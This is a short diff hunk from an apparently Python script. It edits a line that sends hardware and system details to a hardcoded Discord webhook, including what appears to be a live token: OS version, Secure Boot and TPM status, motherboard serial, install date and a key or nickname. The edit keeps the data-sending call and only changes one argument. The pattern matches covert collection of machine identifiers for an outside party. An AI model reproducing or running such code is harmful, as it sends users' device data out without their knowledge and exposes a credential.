@@ -36,7 +36,7 @@ else:
         seconds -= 1
 
 os.system('cls')
-data_send_aes('https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D',my_key_x ,my_os_data ,my_os_version ,my_secureboot ,my_tpm ,my_motherboard_serial ,aes_user_date_installed,myinfo_xx_lc)
+data_send_aes('https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D',server_nickname ,my_os_data ,my_os_version ,my_secureboot ,my_tpm ,my_motherboard_serial ,aes_user_date_installed,myinfo_xx_lc)
 os.system('cls')
 
 
